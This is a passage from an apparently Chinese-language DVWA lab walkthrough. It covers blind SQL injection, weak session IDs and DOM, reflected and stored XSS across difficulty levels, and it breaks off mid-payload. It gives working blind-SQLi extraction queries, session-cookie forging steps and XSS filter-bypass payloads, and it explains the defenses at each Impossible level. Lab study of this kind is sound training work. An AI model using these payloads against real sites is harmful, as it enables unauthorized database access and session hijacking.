src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20131507.png" alt="屏幕截图 2024-02-22 131507"></p><h3 id="4-Impossible-6"><a href="#4-Impossible-6" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132155.png" alt="屏幕截图 2024-02-22 132155"></p><p>首先：此关的代码<code>checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</code> 是一个函数调用用于检查用户提交的 token 是否与会话中存储的 token 匹配</p><p>这种机制通常用于确保表单提交的安全性以防止跨站请求伪造（CSRF）攻击</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132158.png" alt="屏幕截图 2024-02-22 132158"></p><p>其次以上代码检验ID是否为数字只有为数字的时候才会执行查询</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132850.png" alt="屏幕截图 2024-02-22 132850"></p><p>再次有预编译语句可以有效防止SQL注入</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132706.png" alt="屏幕截图 2024-02-22 132706"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20132709.png" alt="屏幕截图 2024-02-22 132709"></p><p>最后以上代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入同时只有返回的查询结果数量为一时，才会成功输出</p><h2 id="八、SQL-Injection-Blind"><a href="#八、SQL-Injection-Blind" class="headerlink" title="八、SQL Injection (Blind)"></a>八、SQL Injection (Blind)</h2><p>判断是否存在注入的两种盲注方法</p><p><strong>布尔盲注</strong></p><p>　　可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><p><strong>时间盲注</strong></p><p>　　通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><h3 id="1-Low-7"><a href="#1-Low-7" class="headerlink" title="1.Low"></a>1.Low</h3><p>此关没有对输入的ID进行处理但是只会返回固定的两个值</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">num大于<span class="hljs-number">0</span>输出<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">database</span><br>num小于等于<span class="hljs-number">0</span> 输出<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span><br></code></pre></td></tr></table></figure><p>因此我们只能通过猜测来确定我们想得到的数据</p><p>查找库名（以数据库名的第一个字母为例）（最终查到的库名：dvwn）</p><p>输入__1’ and (select ascii(substr(database(),1,1)) &gt; 111) – asd__时</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20144402.png" alt="屏幕截图 2024-02-22 144402"></p><p>输入__1’ and (select ascii(substr(database(),1,1)) &gt; 99) – asd__时</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20144805.png" alt="屏幕截图 2024-02-22 144805"></p><p>最终确定数据库第一个字母对应的ascii值为100</p><p>也就是说第一个字母为d</p><ul><li>查找表名</li></ul><p><strong>1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),1,1)) &gt; 101) – asd</strong></p><ul><li>查找表中的第一个字段名</li></ul><p><strong>1’ and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’guestbook’ limit 0,1),1,1)) &gt; 101) – asd</strong></p><ul><li>查找数据库中第一个表中第一个字段中的第一个数据的第一个字母</li></ul><p><strong>1’ and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt;40) – asd</strong></p><p>其余数据以此类推</p><h3 id="2-Medium-7"><a href="#2-Medium-7" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号进行转义同时在前端页面设置了下拉选择表单</p><p>以此来限制用户的输入</p><p>和普通的SQL注入方式差不多只是需要BP来抓包修改参数值</p><p>具体注入方式参考此关的low和上一关的Medium即可</p><p><strong>and (select ascii(substr(database(),1,1)) &lt;114) – asd<br>1 and (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),1,1)) &gt; 102) –       asd<br>1 and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’guestbook’ limit 0,1),1,1)) &gt;100)– asd<br>1 and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt;50)– asd</strong></p><h3 id="3-High-7"><a href="#3-High-7" class="headerlink" title="3.High"></a>3.High</h3><p>此关limit限制查询只能为1条</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20152346.png" alt="屏幕截图 2024-02-22 152346"></p><p>且返回MISSING时会随机执行sleep()函数会延迟在2-4s之间</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151020.png" alt="屏幕截图 2024-02-22 151020"></p><p>除此之外跟Low没有区别</p><h3 id="4-Impossible-7"><a href="#4-Impossible-7" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><ul><li><p>Anti-CSRF token机制的加入了进一步提高了安全性，session_token是随机生成的动态值，每次向服务器请求，客户端都会携带最新从服务端已下发的session_token值向服务器请求作匹配验证，相互匹配才会验证通过</p><p>如图：</p></li></ul><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151825.png" alt="屏幕截图 2024-02-22 151825"></p><ul><li>利用is_numeric($id)函数来判断输入的id是否是数字or数字字符串，满足条件才知晓query查询语句</li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151905.png" alt="屏幕截图 2024-02-22 151905"></p><ul><li>代码采用了PDO技术 划清了代码与数据的界限 有效防御SQL注入还有 预编译语句以防止了SQL注入</li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151945.png" alt="屏幕截图 2024-02-22 151945"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20151938.png" alt="屏幕截图 2024-02-22 151938"></p><ul><li>只有当返回的查询结果数量为一个记录时，才会成功输出，这样就有效预防了暴库</li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20152241.png" alt="屏幕截图 2024-02-22 152241"></p><h2 id="九、Weak-Session-IDs"><a href="#九、Weak-Session-IDs" class="headerlink" title="九、Weak Session IDs"></a>九、Weak Session IDs</h2><p>Weak Session IDs（弱会话），用户访问服务器的时候，一般服务器都会分配一个身份证 session id 给用户，用于标识。用户拿到 session id 后就会保存到 cookies 上，之后只要拿着 cookies 再访问服务器，服务器就知道你是谁了。</p><p>但是 session id 过于简单就会容易被人伪造。根本都不需要知道用户的密码就能访问，用户服务器的内容了。</p><h3 id="1-Low-8"><a href="#1-Low-8" class="headerlink" title="1.Low"></a>1.Low</h3><p>源码分析</p><p>服务器每次生成的session_id加1给客户端， <code>setcookie(&quot;dvwaSession&quot;, $cookie_value);</code>就是设置session的值</p><p>抓包查看Cookie</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20155307.png" alt="屏幕截图 2024-02-22 155307"></p><p>将以上Cookie复制</p><p>并到请求链接中：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20155803.png" alt="屏幕截图 2024-02-22 155803"></p><p>然后抓这个链接的包并将里面的Cookie值改成上面复制的Cookie发包后便可以直接登录</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20155235.png" alt="屏幕截图 2024-02-22 155235"></p><h3 id="2-Medium-8"><a href="#2-Medium-8" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>源码分析</p><p>采用time函数获取时间戳 作为cookie值</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20160101.png" alt="屏幕截图 2024-02-22 160101"></p><p>然后进行抓包</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20160554.png" alt="屏幕截图 2024-02-22 160554"></p><p>然后操作和上一关一样</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20161934.png" alt="屏幕截图 2024-02-22 161934"></p><h3 id="3-High-8"><a href="#3-High-8" class="headerlink" title="3.High"></a>3.High</h3><ul><li><p>首先使用!isset()函数对session变量进行检查，如果没有进行赋值。则设置为0，然后每一次都递增1。</p></li><li><p>然后将session变量进行MD5加密后赋值为cookie_value变量。</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165019.png" alt="屏幕截图 2024-02-22 165019"></p></li></ul><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165307.png" alt="屏幕截图 2024-02-22 165307"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li><code>dvwaSession</code>：这是要设置的 cookie 的名称。</li><li><code>$cookie_value</code>：这是要分配给 cookie 的值，通常是一个字符串。</li><li><code>time()+3600</code>：这是 cookie 的过期时间，表示当前时间戳加上 3600 秒，即 1 小时后过期。</li><li><code>&quot;/vulnerabilities/weak_id/&quot;</code>：这是指定了 cookie 可用的路径，只有在指定的路径下才能访问到这个 cookie。</li><li><code>$_SERVER[&#39;HTTP_HOST&#39;]</code>：这是指定了 cookie 可用的域名，只有在指定的域名下才能访问到这个 cookie。</li></ul><p>然后开始抓包</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165949.png" alt="屏幕截图 2024-02-22 165949"></p><p>发现请求参数其实和安全等级为medium一样的发给重发器看下</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165913.png" alt="屏幕截图 2024-02-22 165913"></p><p>进行md5解密</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20165829.png" alt="屏幕截图 2024-02-22 165829"></p><p>把构造的cookie复制：<code>dvwaSession=c4ca4238a0b923820dcc509a6f75849b; security=high; PHPSESSID=48irlbhh616ri2kgj2ls9fpl78;</code></p><p>打开火狐浏览器，输入url，抓包拦截,修改cookie的值</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20170941.png" alt="屏幕截图 2024-02-22 170941"></p><h3 id="4-Impossible-8"><a href="#4-Impossible-8" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算完全不能猜测到dvwaSession的值</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222171342357.png" alt="image-20240222171342357"></p><p>注：sha1运算就是一种加密算法</p><h2 id="十、XSS-DOM"><a href="#十、XSS-DOM" class="headerlink" title="十、XSS (DOM)"></a>十、XSS (DOM)</h2><p>DOM—based XSS漏洞是基于文档对象模型的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞</p><h3 id="1-Low-9"><a href="#1-Low-9" class="headerlink" title="1.Low"></a>1.Low</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222172038704.png" alt="image-20240222172038704"></p><p>源代码显示不存在任何保护</p><p>搞个弹窗试一哈     payload:   ?default&#x3D;<script>alert("糟糕被你发现鸡脚了！！！")</script></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20172354.png" alt="屏幕截图 2024-02-22 172354"></p><h3 id="2-Medium-9"><a href="#2-Medium-9" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>代码分析</p><p>过滤掉了“&lt;script”，当函数匹配到 &lt;script 字符串的时候就会将URL后面的参数修正为 ?default&#x3D;English</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20172726.png" alt="屏幕截图 2024-02-22 172726"></p><p>我们可以换个标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload详解：</p><ul><li><code>&lt;/option&gt;&lt;/select&gt;</code>：这是一些 HTML 结束标签，可能是为了终止之前的 HTML 元素。</li><li><code>&lt;img src=x onerror=alert(1)&gt;</code>：这是一个 <code>&lt;img&gt;</code> 标签，其中的 <code>src</code> 属性被设置为 <code>x</code>，而 <code>onerror</code> 属性中包含了 JavaScript 代码 <code>alert(1)</code>。这意味着如果加载图像时发生错误就会执行 <code>alert(1)</code> 这段 JavaScript 代码因为src&#x3D;x根本不存在所以一定会执行 <code>alert(1)</code></li></ul><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20173522.png" alt="屏幕截图 2024-02-22 173522"></p><h3 id="3-High-9"><a href="#3-High-9" class="headerlink" title="3.High"></a>3.High</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20174237.png" alt="屏幕截图 2024-02-22 174237"></p><p>在以上代码中就相当于使用了白名单只能输入允许的值</p><p><strong>这里就要用到URL中的一个特殊字符#，这个字符后的数据不会发送到服务器端，相当于绕过了后端的过滤，不需要与服务端进行交互，直接在客户端处理数据的阶段执行</strong></p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?#default=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20174655.png" alt="屏幕截图 2024-02-22 174655"></p><h3 id="4-Impossible-9"><a href="#4-Impossible-9" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20174736.png" alt="屏幕截图 2024-02-22 174736"></p><p>有源码可知：</p><p>Don’t need to do anything, protction handled on the client side</p><p>不需要做任何事情，保护就在客户端</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20175009.png" alt="屏幕截图 2024-02-22 175009"></p><p>发现我们输入的任何数据全部无效了，无法实现XSS</p><h2 id="十一、XSS-Reflected"><a href="#十一、XSS-Reflected" class="headerlink" title="十一、XSS (Reflected)"></a>十一、XSS (Reflected)</h2><p>XSS反射型漏洞</p><p>反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的data URI编码，后端解析用户输入处理后返回给前端，由浏览器解析这段XSS脚本，触发XSS漏洞</p><h3 id="1-Low-10"><a href="#1-Low-10" class="headerlink" title="1.Low"></a>1.Low</h3><p>后端代码只是判断了 name 参数是否为空，如果不为空的话就直接打印出来。服务器并没有对 name 参数做任何的过滤和检查</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20175938.png" alt="屏幕截图 2024-02-22 175938"></p><p>因此我们直接传入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222180113189.png" alt="image-20240222180113189"></p><h3 id="2-Medium-10"><a href="#2-Medium-10" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>此关过滤了传入数据中的  <script></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222180237502.png" alt="image-20240222180237502"></p><ul><li>我们可以换个标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>至于为什么详见第十关的Medium</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20180326.png" alt="屏幕截图 2024-02-22 180326"></p><ul><li><p>还可以使用大小写绕过。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scRipt</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>​如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20180917.png" alt="屏幕截图 2024-02-22 180917"></p><ul><li><p>或者使用双写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ript&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p></li></ul><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222180750542.png" alt="image-20240222180750542"></p><h3 id="3-High-10"><a href="#3-High-10" class="headerlink" title="3.High"></a>3.High</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20181506.png" alt="屏幕截图 2024-02-22 181506"></p><p>由上图可知：</p><p>preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表连续匹配任意字符，“i” 代表不区分大小写</p><p>也就是说 “< script >” 标签在这里被完全过滤了，但是我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">1</span> <span class="hljs-attr">onerror</span> = <span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20181600.png" alt="屏幕截图 2024-02-22 181600"></p><h3 id="4-Impossible-10"><a href="#4-Impossible-10" class="headerlink" title="4. Impossible"></a>4. Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20181710.png" alt="屏幕截图 2024-02-22 181710"></p><p>由图可知：</p><p>htmlspecialchars() 函数用于把预定义的字符 "<" 和 ">" 转换为 HTML 实体，防止了我们注入 HTML 标签</p><p>htmlspecialchars 函数会将 < 和 > 转换成 html 实体而不是当做标签，所以我们插入的语句并不会被执行</p><p>同时加入token防护 CSRF 攻击，进一步提高安全性</p><h2 id="十二、XSS-Stored"><a href="#十二、XSS-Stored" class="headerlink" title="十二、XSS (Stored)"></a>十二、XSS (Stored)</h2><p>XSS存储型攻击，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码</p><h3 id="1-Low-11"><a href="#1-Low-11" class="headerlink" title="1.Low"></a>1.Low</h3><p>源码中出现的不认识的函数：</p><p>（1）trim()函数</p><p>语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">trim</span><span class="hljs-params">(string,charlist)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td><td></td><td></td><td></td><td></td></tr><tr><td>charlist</td><td>可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符："\0" - NULL"\t" - 制表符"\n" - 换行"\x0B" - 垂直制表符"\r" - 回车" " - 空格</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>（2）stripslashes()函数</p><p>语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">stripslashes</span><span class="hljs-params">(string)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td></tr></tbody></table><p>用于删除反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。</p><p><> 没有做过滤与检查而且数据将被存储到数据库中，因此存在存储型XSS</p><p>name处有长度限制因此直接在message一栏使用我们的代码尝试：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20183158.png" alt="屏幕截图 2024-02-22 183158"></p><p>然后查看数据库发现已经储存到数据库中</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20183426.png" alt="屏幕截图 2024-02-22 183426"></p><p>注意：在进行下一个等级之前先把这条数据给删了</p><h3 id="2-Medium-11"><a href="#2-Medium-11" class="headerlink" title="2.Medium"></a>2.Medium</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191125.png" alt="屏幕截图 2024-02-22 191125"></p><p>Message处使用了htmlspecialchars()函数，将字符全部转为了HTML实体，而且使用了strip_tags函数会将字符串中HTML 和 PHP 标签去除 </p><p>因此Message处无法使用XSS形成攻击。</p><p>name处做了长度限制，因此考虑使用抓包在bp中修改name的值，还有就是他会将 <script> 转化为空，所有考虑使用双写或者大小写去绕过。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">大小写绕过：<span class="hljs-tag">&lt;<span class="hljs-name">scRIpt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">SCript</span>&gt;</span><br>双写绕过：&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191449.png" alt="屏幕截图 2024-02-22 191449"></p><p>改好包后发送即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191457.png" alt="屏幕截图 2024-02-22 191457"></p><p>数据库结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191508.png" alt="屏幕截图 2024-02-22 191508"></p><p>同样 注意：在进行下一个等级之前先把这条数据给删了</p><h3 id="3-High-11"><a href="#3-High-11" class="headerlink" title="3.High"></a>3.High</h3><p>跟十一关的High等级相似“< script >” 标签在这里被完全过滤且无法通过Message来进行xss</p><p>代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192030.png" alt="屏幕截图 2024-02-22 192030"></p><p>payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">1</span> <span class="hljs-attr">onerror</span> = <span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span 